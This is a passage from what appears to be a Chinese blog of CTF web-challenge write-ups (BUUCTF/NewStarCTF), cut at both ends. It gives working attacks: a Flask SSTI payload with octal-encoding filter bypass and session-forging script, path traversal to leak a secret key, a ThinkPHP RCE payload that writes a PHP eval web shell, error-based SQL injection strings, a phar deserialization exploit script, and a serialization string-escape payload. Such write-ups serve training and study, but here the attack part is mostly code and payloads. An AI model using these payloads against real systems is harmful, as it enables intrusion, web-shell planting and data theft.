<span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(session.get(<span class="string">&quot;user&quot;</span>))</span><br><span class="line">        <span class="keyword">if</span> session.get(<span class="string">&quot;user&quot;</span>) <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            session[<span class="string">&#x27;user&#x27;</span>] = <span class="string">&quot;guest&quot;</span></span><br><span class="line">        name = session.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> re.findall(</span><br><span class="line">                <span class="string">r&#x27;__|&#123;&#123;|class|base|init|mro|subclasses|builtins|globals|flag|os|system|popen|eval|:|\+|request|cat|tac|base64|nl|hex|\\u|\\x|\.&#x27;</span>,</span><br><span class="line">                name):</span><br><span class="line">            abort(<span class="number">500</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template_string(</span><br><span class="line">                <span class="string">&#x27;竟然给&lt;h1&gt;%s&lt;/h1&gt;你找到了我的后门，你一定是网络安全大赛冠军吧！😝 &lt;br&gt; 那么 现在轮到你了!&lt;br&gt; 最后祝您玩得愉快!😁&#x27;</span> % name)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        abort(<span class="number">500</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">404</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">page_not_find</span>(<span class="params">e</span>):</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;404.html&#x27;</span>), <span class="number">404</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(<span class="params"><span class="number">500</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">internal_server_error</span>(<span class="params">e</span>):</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;500.html&#x27;</span>), <span class="number">500</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>核心在<code>/backdoor</code>路由，应该是session传入脚本进行命令执行</p><p>这个简单，找到<code>secret_key</code>然后把命令加密就行</p><p>开头看到<code>secret_key</code>放入了config文件中，下载一下config：<code>download?file=....//....//....//app/config.py</code></p><p>得到<code>secret_key = &quot;y0u_n3ver_k0nw_s3cret_key_1s_newst4r&quot;</code></p><p>由于许多命令被过滤掉了，可以考虑八进制编码绕过</p><p>最初的攻击脚本可以这样写：<code>&#123;&#123;x.__init__.__globals__.__getitem__.('__builtins__').__getitem__.('eval')('__import__("os").popen("ls /").read()')&#125;&#125;</code></p><p>攻击脚本分析如下：（<del>gpt写的</del>）</p><ol><li><code>x.__init__.__globals__.__getitem__</code>：这部分尝试访问 <code>x</code> 对象的 <code>__init__</code> 方法的全局作用域。<code>__init__</code> 是 Python 类的构造函数，而 <code>__globals__</code> 是一个字典，存储了函数的全局变量。</li><li><code>__getitem__(&#39;__builtins__&#39;)</code>：通过 <code>__getitem__</code> 方法获取 <code>__builtins__</code> 模块，这是一个包含了 Python 所有内置函数和变量的模块。</li><li><code>__getitem__(&#39;eval&#39;)</code>：进一步通过 <code>__getitem__</code> 获取内置的 <code>eval</code> 函数。<code>eval</code> 函数用于执行一个字符串表达的 Python 表达式，并返回表达式的值。</li><li><code>eval(&#39;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#39;)</code>：通过 <code>eval</code> 执行字符串中的代码。这段代码首先通过 <code>__import__(&quot;os&quot;)</code> 导入 <code>os</code> 模块，然后使用 <code>os.popen(&quot;ls /&quot;)</code> 执行 Unix/Linux 命令 <code>ls /</code>，该命令列出根目录下的所有文件和文件夹。最后，使用 <code>.read()</code> 方法读取命令的输出结果。</li></ol><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="comment"># 把这个下载了，需要使用里面的flask-session-cookie-manager3.py</span></span><br><span class="line"><span class="comment"># # https://github.com/noraj/flask-session-cookie-manager</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">string_to_octal_ascii</span>(<span class="params">s</span>):</span><br><span class="line">    octal_ascii = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> s:</span><br><span class="line">        char_code = <span class="built_in">ord</span>(char)</span><br><span class="line">        octal_ascii += <span class="string">&quot;\\\\&quot;</span> + <span class="built_in">format</span>(char_code, <span class="string">&#x27;03o&#x27;</span>)</span><br><span class="line">        <span class="comment"># octal_ascii += &quot;\\\\&quot; + format(char_code, &#x27;o&#x27;)    </span></span><br><span class="line">    <span class="keyword">return</span> octal_ascii</span><br><span class="line">secret_key = <span class="string">&quot;y0u_n3ver_k0nw_s3cret_key_1s_newst4r&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;&#123;%print(7*7)%&#125;&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;&#123;%print(\&quot;\&quot;\\\\u005f\\\\u005f\&quot;\&quot;)%&#125;&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;&#123;%print(\&quot;\&quot;\\\\x5f\\\\x5f\&quot;\&quot;)%&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">eval_shell = <span class="string">&quot;\&quot;\&quot;&quot;</span>+string_to_octal_ascii(<span class="string">&quot;__import__(\&quot;os\&quot;).popen(\&quot;cat /*\&quot;).read()&quot;</span>)+<span class="string">&quot;\&quot;\&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(eval_shell)</span><br><span class="line"><span class="comment"># docker部署&amp;windows运行payload</span></span><br><span class="line"><span class="comment"># &#123;&#123;x.__init__.__globals__.__builtins__.eval(&#x27;__import__(&quot;os&quot;).popen(&quot;dir&quot;).read()&#x27;)&#125;&#125;</span></span><br><span class="line">payload = <span class="string">&quot;&#123;&#123;%print(xxx|attr(\&quot;\&quot;\\\\137\\\\137\\\\151\\\\156\\\\151\\\\164\\\\137\\\\137\&quot;\&quot;)|attr(\&quot;\&quot;\\\\137\\\\137\\\\147\\\\154\\\\157\\\\142\\\\141\\\\154\\\\163\\\\137\\\\137\&quot;\&quot;)|attr(\&quot;\&quot;\\\\137\\\\137\\\\147\\\\145\\\\164\\\\151\\\\164\\\\145\\\\155\\\\137\\\\137\&quot;\&quot;)(\&quot;\&quot;\\\\137\\\\137\\\\142\\\\165\\\\151\\\\154\\\\164\\\\151\\\\156\\\\163\\\\137\\\\137\&quot;\&quot;)|attr(\&quot;\&quot;\\\\137\\\\137\\\\147\\\\145\\\\164\\\\151\\\\164\\\\145\\\\155\\\\137\\\\137\&quot;\&quot;)(\&quot;\&quot;\\\\145\\\\166\\\\141\\\\154\&quot;\&quot;)(&#123;0&#125;))%&#125;&#125;&quot;</span>.<span class="built_in">format</span>(eval_shell)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">command = <span class="string">&quot;python flask_session_cookie_manager3.py encode -s \&quot;&#123;0&#125;\&quot; -t \&quot;&#123;&#123;&#x27;user&#x27;:&#x27;&#123;1&#125;&#x27;&#125;&#125;\&quot;&quot;</span>.<span class="built_in">format</span>(secret_key,payload)</span><br><span class="line"><span class="built_in">print</span>(command)</span><br><span class="line"></span><br><span class="line">session_data = subprocess.check_output(command, shell=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">print</span>(session_data)</span><br><span class="line"><span class="comment"># linux和windows换行不一样，linux是去掉最后一个，windows是最后两个。</span></span><br><span class="line">session_data = session_data[:-<span class="number">2</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="comment"># session_data = session_data[:-1].decode(&#x27;utf-8&#x27;)</span></span><br><span class="line"><span class="built_in">print</span>(session_data)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:8080/backdoor&quot;</span></span><br><span class="line">cookies = &#123;<span class="string">&quot;session&quot;</span>: session_data&#125;</span><br><span class="line">res = requests.get(url=url, cookies=cookies)</span><br><span class="line"><span class="comment"># print(res.text)</span></span><br><span class="line">pattern = <span class="string">r&#x27;&lt;h1&gt;(.*)&lt;/h1&gt;&#x27;</span></span><br><span class="line">result_content = re.search(pattern, res.text, re.S)</span><br><span class="line"><span class="comment"># print(result_content)</span></span><br><span class="line"><span class="keyword">if</span> result_content:</span><br><span class="line">    result = result_content.group(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;something wrong!&quot;</span>)</span><br></pre></td></tr></table></figure><p>这里复现失败了，不道为什么</p><h1 id="NewStarCTF-2023-公开赛道-Final"><a href="#NewStarCTF-2023-公开赛道-Final" class="headerlink" title="[NewStarCTF 2023 公开赛道]Final"></a>[NewStarCTF 2023 公开赛道]Final</h1><img src="/2024/03/29/buuctf/buu2/image-20240422170012715.png" class="" title="image-20240422170012715"><p>传参使其报错，获取版本号，根据版本号找到payload：<code>_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=id</code></p><p>然后变量s传数据<code>captcha</code>，发包改为<code>POST</code>方式（system看起来是被ban了，所以看看phpinfo）</p><img src="/2024/03/29/buuctf/buu2/image-20240422171446324.png" class="" title="image-20240422171446324"><p>能够执行，那就找一下<code>DOCUMENT_ROOT</code>，它是当前运行的脚本所在的文档根目录的绝对路径，把马写在里面</p><p>payload:<code>_method=__construct&amp;filter[]=exec&amp;method=get&amp;server[REQUEST_METHOD]=echo &#39;&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;&#39; &gt; /var/www/public/shell.php</code></p><img src="/2024/03/29/buuctf/buu2/image-20240422174221914.png" class="" title="image-20240422174221914"><p>这里没有读取到flag，猜测是权限的问题</p><p>用蚁剑连接进入终端，执行以下命令即可】</p><img src="/2024/03/29/buuctf/buu2/image-20240422174738112.png" class="" title="image-20240422174738112"><h1 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h1><p>这题是报错注入，过滤了空格和<code>=</code>，<code>=</code>可以考虑用like绕过，空格可以用<code>^</code>绕过</p><p>当然了，还禁用了其他符号，比如说<code>*</code></p><p>payload如下：</p><p><code>?username=1&amp;password=1&#39;^extractvalue(1%2Cconcat(0x7e%2C(select(database()))))%23</code></p><p><code>?username=1&amp;password=1&#39;^extractvalue(1%2Cconcat(0x7e%2C(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#39;geek&#39;))))%23</code></p><p><code>?username=1&amp;password=1&#39;^extractvalue(1%2Cconcat(0x7e%2C(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;))))%23</code></p><p><code>?username=1&amp;password=1&#39;^extractvalue(1%2Cconcat(0x7e%2C(select(password)from(geek.H4rDsq1))))%23</code></p><p>由于flag只显示一部分，说明原文本的长度超过限定长度，可以考虑用left或right函数</p><img src="/2024/03/29/buuctf/buu2/image-20240424135643946.png" class="" title="image-20240424135643946"><p><code>?username=1&amp;password=1&#39;^extractvalue(1%2Cconcat(0x7e%2C(select(right(password%2C20))from(geek.H4rDsq1))))%23</code></p><img src="/2024/03/29/buuctf/buu2/image-20240424140153927.png" class="" title="image-20240424140153927"><h1 id="NewStarCTF-2023-公开赛道-Unserialize-Again"><a href="#NewStarCTF-2023-公开赛道-Unserialize-Again" class="headerlink" title="[NewStarCTF 2023 公开赛道]Unserialize Again"></a>[NewStarCTF 2023 公开赛道]Unserialize Again</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">story</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pass</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eating</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$God</span>=<span class="string">&#x27;false&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user=<span class="string">&#x27;human&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="number">1</span>==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="number">1</span>!=<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$fffflag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;user=<span class="string">&#x27;AshenOne&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;eating=<span class="string">&#x27;fire&#x27;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user.<span class="variable language_">$this</span>-&gt;pass;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;user==<span class="string">&#x27;admin&#x27;</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;pass==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$nothing</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;God==<span class="string">&#x27;true&#x27;</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;user==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;eating);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Get Out!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;                 </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pear&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;apple&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// $Eden=new story();</span></span><br><span class="line">    <span class="variable">$pear</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;pear&#x27;</span>];</span><br><span class="line">    <span class="variable">$Adam</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;apple&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$pear</span>,<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>));</span><br><span class="line">    <span class="title function_ invoke__">file_exists</span>(<span class="variable">$Adam</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;多吃雪梨&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这题主要考phar伪协议，由于<code>file_exists()</code>中的变量可控，我们可以用其配合phar伪协议读取写入的文件来getshell。</p><h2 id="phar文件生成"><a href="#phar文件生成" class="headerlink" title="phar文件生成"></a>phar文件生成</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">story</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$eating</span> = <span class="string">&#x27;cat /f*&#x27;</span>;  </span><br><span class="line"><span class="keyword">public</span> <span class="variable">$God</span>=<span class="string">&#x27;true&#x27;</span>;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;1.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;php __HALT_COMPILER(); ?&gt;&quot;</span>); </span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">story</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><p>这里我们需要运行的是<code>__destruct()</code>的<code>system</code>，因此把eating和God改了就好</p><h2 id="传马"><a href="#传马" class="headerlink" title="传马"></a>传马</h2><img src="/2024/03/29/buuctf/buu2/image-20240424144516861.png" class="" title="image-20240424144516861"><p>由于在文件生成过程中内容被修改过（为了绕过<code>__wakeup()</code>，因此需要更换一个签名，这里用到了sha256）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;1.phar&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file1:</span><br><span class="line">    f = file1.read()</span><br><span class="line"></span><br><span class="line">s = f[:-<span class="number">40</span>]</span><br><span class="line">s = s.replace(<span class="string">b&#x27;O:5:&quot;story&quot;:2&#x27;</span>,<span class="string">b&#x27;O:5:&quot;story&quot;:3&#x27;</span>)</span><br><span class="line">h = f[-<span class="number">8</span>:]</span><br><span class="line">newfile = s + sha256(s).digest() + h</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;new.phar&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file2:</span><br><span class="line">    file2.write(newfile)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://bd7d412e-1f2f-4257-b51b-8602813e8098.node5.buuoj.cn:81/pairing.php&#x27;</span></span><br><span class="line">param = &#123;</span><br><span class="line">    <span class="string">&#x27;pear&#x27;</span>: <span class="string">&#x27;new.phar&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;apple&#x27;</span>: <span class="string">&#x27;phar://new.phar&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;new.phar&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file3:</span><br><span class="line">    f = file3.read()</span><br><span class="line">    fi = urllib.parse.quote(f)</span><br><span class="line">    <span class="built_in">print</span>(fi)</span><br><span class="line">    res = requests.post(url=url,params=param,data=fi)</span><br><span class="line">    <span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><img src="/2024/03/29/buuctf/buu2/image-20240424152942933.png" class="" title="image-20240424152942933"><h1 id="NewStarCTF-2023-公开赛道-逃"><a href="#NewStarCTF-2023-公开赛道-逃" class="headerlink" title="[NewStarCTF 2023 公开赛道]逃"></a>[NewStarCTF 2023 公开赛道]逃</h1><p>这题就是反序列化中的字符逃逸</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;bad&quot;</span>,<span class="string">&quot;good&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="variable">$key</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">waf</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">GetFlag</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>]))));</span><br></pre></td></tr></table></figure><p>根据代码，当有一个bad转换为good时，原字符串就会多一个字符</p><p>字符串逃逸原理<a href="https://blog.csdn.net/qq_45521281/article/details/107135706">看看这里</a></p><p>了解完原理后，我们脚本可以这样写：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GetFlag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span> = <span class="string">&quot;ls /&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="variable">$key</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">GetFlag</span>(<span class="string">&#x27;badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&#x27;</span>);<span class="comment">//&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;中共有24个字符，所以要24个bad</span></span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="/2024/03/29/buuctf/buu2/image-20240424155210605.png" class="" title="image-20240424155210605"><p>payload为<code>badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&quot;;s:3:&quot;cmd&quot;;s:4:&quot;ls /&quot;;&#125;</code></p><img src="/2024/03/29/buuctf/buu2/image-20240424155252108.png" class="" title="image-20240424155252108"><p>把命令改了拿flag即可</p><h1 id="NewStarCTF-2023-公开赛道-More-Fast"><a href="#NewStarCTF-2023-公开赛道-More-Fast" class="headerlink" title="[NewStarCTF 2023 公开赛道]More Fast"></a>[NewStarCTF 2023 公开赛道]More Fast</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 